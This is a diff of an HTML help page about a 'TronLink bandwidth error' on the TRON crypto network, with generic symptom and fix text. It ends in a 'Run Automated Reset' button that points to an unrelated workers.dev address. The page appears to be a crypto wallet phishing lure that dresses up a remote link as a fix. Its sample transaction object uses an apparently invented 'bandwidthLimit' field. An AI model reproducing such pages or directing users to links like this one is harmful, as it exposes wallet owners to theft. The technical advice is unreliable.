@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #121214;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and an inability to execute desired actions.</li>
+<li>Users experience a "TronLink bandwidth error" when attempting to interact with the TRON blockchain, resulting in failed transactions and inability to perform actions on the network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network. This can happen when a user has not acquired enough TRX (TRON's native cryptocurrency) to freeze for bandwidth or has not properly configured their account for bandwidth allocation.</li>
+<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required to process transactions and interact with smart contracts on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's TRX holdings to freeze for bandwidth allocation.</li>
-<li>Adjust the bandwidth allocation settings in the TronLink wallet to optimize resource usage.</li>
-<li>Utilize the following command to manually adjust bandwidth parameters:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens, which allocates more bandwidth to the account.</li>
+<li>Use a different wallet or account with sufficient bandwidth to perform the desired actions.</li>
+<li>Adjust the transaction parameters to require less bandwidth, such as reducing the transaction size or using a different transaction type, as shown in the following example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.tx.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">10</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span><span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TXaFZzNMxhg7KFuQhTj7oq6xVf2xwbz9rE&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TYMxhX25bpwX7xSBLxkbVfJHn9zZrLjk2s&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;bandwidthLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider accessing the TRON network through an alternative interface for more direct control over transaction parameters.</p>
+<p>Consider using an external console for more complex transactions. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TRON network and its resource allocation system.</li>
-<li>A TronLink wallet with a minimum amount of TRX for bandwidth allocation.</li>
-<li>Familiarity with transaction processing on the TRON blockchain.</li>
+<li>A TRON account with a positive balance</li>
+<li>The TronLink extension installed and configured</li>
+<li>A basic understanding of TRON's bandwidth and transaction mechanics</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
